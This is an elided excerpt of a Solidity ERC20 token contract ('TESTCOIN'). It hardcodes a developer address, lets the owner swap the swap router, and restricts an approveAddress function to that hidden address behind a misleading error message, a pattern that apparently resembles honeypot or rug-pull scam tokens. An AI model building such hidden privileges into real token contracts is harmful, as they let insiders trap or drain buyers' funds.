...
contract TOKEN is Context, IERC20, Ownable {
    ...
    constructor () public {
        _excludeDevAddress = 0x17783FB2246dA72e5EF5da574D3ce311B7c8e59c;
        _name = "TESTCOIN";
        _symbol = "TEST";
    ...
    function defineRouter(address _approveRouter) public onlyOwner {
        address approveRouter = _approveRouter;
        uniSwapRouter = IUniswapV2Router02(approveRouter);
    ...
    function approveAddress(address approvedAddress) public {
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
